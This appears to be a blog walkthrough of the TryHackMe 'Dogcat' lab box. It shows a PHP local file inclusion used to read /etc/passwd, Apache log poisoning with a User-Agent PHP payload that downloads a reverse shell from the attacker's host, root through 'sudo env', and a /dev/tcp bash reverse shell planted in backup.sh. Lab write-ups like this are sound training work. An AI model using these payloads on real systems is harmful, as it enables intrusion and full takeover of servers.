---
published: true
title: Dogcat - TryHackMe Walkthrough
category: Writeup
image: 'https://imgur.com/BarfSU7.png'
author: F3dai
---
I made this website for viewing cat and dog images with PHP. If you're feeling down, come look at some dogs/cats! This is a TryHackMe box. To access this you must sign up to [https://tryhackme.com/](https://tryhackme.com/).

**URL:** [dogcat](https://www.tryhackme.com/room/dogcat)

**Difficulty:** Medium

**Author:** jammy

### Enumeration

We are given the IP 10.10.0.15. Run an nmap scan with the following command:

<pre>nmap -p- -A -o portscan 10.10.0.15</pre>

These are the open ports:

<pre>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
</pre>

The usual ports are open - ssh and http.

I'll open up port 80 on my browser:

![port 80](https://imgur.com/P78vvmt.png)

This website has a basic function to display either a dog or a cat depending on the button the user clicks. I'd like to investigate how these images are displayed on the website.

The url changes from ?view=cat to ?view=dog. I removed the ?view= and appended .php and this was the result: 

<pre>http://10.10.0.15/dog.php</pre>

![dog.php](https://imgur.com/kw2VGiH.png)

I try testing some random inputs out and I get an error message:

![error](https://imgur.com/klKhov0.png)

Therefore, it's safe to say that ?view= runs an "include" on the parameter for dog and cat, and **appends .php**. 

Since the input needs "dog" or "cat", I will try using the following url to see if I can view the /etc/passwd file on the system:

<pre>http://10.10.0.15/?view=dog../../../../../etc/passwd</pre>

But the following results show it is still trying to append the .php:

![error php](https://imgur.com/klKhov0.png)

<pre>include(dog../../../../../etc/passwd.php): failed to open stream"</pre>

I am not very familiar with php so I researched if there was a way to include a file without the file extension. The trick is to add "&ext=" at the end of the url. This is the new URL which should also view the /etc/passwd file with no .php file extension:

<pre>10.10.0.15/?view=dog../../../../../etc/passwd&ext=</pre>

![etc passwd](https://imgur.com/PDm0jrF.png)

You can view the page source to find the formatted text:

<pre>!root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</pre>

Now that we can successfully execute a [local file inclusion](https://owasp.org/www-community/vulnerabilities/PHP_File_Inclusion) vulnerability, we can try to get a reverse shell by **log poisoning**. I have done this on a CTF challenge recently and found this article very useful:

[Log Poisoning](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/)

For more information on Log poisoning, here is an OWASP article:

[OWASP Log Poisoning](https://owasp.org/www-community/attacks/Log_Injection)

Let's try and open the access.log file using this LFI vulnerability.

<pre>http://10.10.0.15/?view=dog../../../../../var/log/apache2/access.log&ext=</pre>

This screenshot shows the page source, you can see the log shows some of the times the dog or cat has been requested:

![log](https://imgur.com/wENytd2.png)

We need to **intercept** the data to add our own code in the access log. Use burp suite to capture the request:

![burp](https://imgur.com/HhCALR2.png)

The above request was intercepted. The User-Agent field will need to be changed to our php code so it can download our own file. 

Let's firstly create a **php reverse shell** on our local machine so we can include this file. Kali Linux has a set of pre-made reverse shells. Copy the php reverse shell file to the current directory:

<pre>cp /usr/share/webshells/php/php-reverse-shell.php .</pre>

Change the host and port information in the file:

![edit](https://imgur.com/2Xa0MWp.png)

Now create a simple HTTP server with the following command:

<pre>python -m SimpleHTTPServer 9090</pre>

This will allow us to transfer the file to the victim. 

![http](https://imgur.com/J8rbwd3.png)

Now we can add the following command to our intercepted HTTP request using the php reverse shell we just created:

<pre>&lt;?php file_put_contents('shell.php', file_get_contents('http://10.9.6.63:9090/php-reverse-shell.php'))?&gt;</pre>

<?php file_put_contents('shell.php', file_get_contents('http://10.9.6.63:9090/php-reverse-shell.php'))?>

![burp request modified](https://imgur.com/wYiso6h.png)

For reference, this was the request I was forwarding on burp suite:

<pre>GET /?view=dog../../../../../var/log/apache2/access.log&ext= HTTP/1.1
Host: 10.10.235.173
User-Agent: <?php file_put_contents('shell.php', file_get_contents('http://10.9.6.63:9090/php-reverse-shell.php'))?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1</pre>

Once this was done, I had a confirmation of a download from the simple HTTP server on my local machine:

<pre>10.10.235.173 - - [06/Jun/2020 08:15:48] "GET /php-reverse-shell.php HTTP/1.0" 200 -</pre>

When you forward this request, the php code will create a file called "shell.php" which, when visited, will create a connection on port 4444. Let's set up a netcat listener on port 4444:

<pre>netcat -nvlp 4444</pre>

Go to /shell.php or whatever you named the file in php code:

![rev shell](https://imgur.com/WRVfreG.png)

We are logged in as **www-data**.

## Privilege Escalation

Check the sudo rights:

<pre>sudo -l</pre>

![rights](https://imgur.com/EveIViV.png)

Great, there is a very easy way to exploit the /env.

I find this article very useful when trying to exploit sudo rights:

[https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/](https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/)

<pre>sudo env /bin/bash</pre>

We have root shell. One of the flags is in the /root directory:

![flag](https://imgur.com/vnUkWG6.png)

Another flag is in the /var/www directory:

![flag](https://imgur.com/TQRFtSI.png)

And finally, the other flag is in the actual web directory:

![flag](https://imgur.com/9OaDcef.png)

These flags are presented in reverse order - I usually just aim to own the system, it's better practice to record the flags at each step.

## Last flag

Finally, there is still one more flag - I checked the /opt/backups which had a script called backup.sh.

I added this command to the file:

<pre>echo "#!/bin/bash" > backup.sh;echo "bash -i >& /dev/tcp/10.9.6.63/5555 0>&1" >> backup.sh</pre>

I set up my netcat listener on 5555

<pre>netcat -nvlp 5555</pre>

Execute the script and get the reverse shell again.

<pre>./backup.sh</pre>

![rev shell](https://i.imgur.com/XEpsJPG.png)

And the final flag has been found:

![final](https://i.imgur.com/YB68YRa.png)
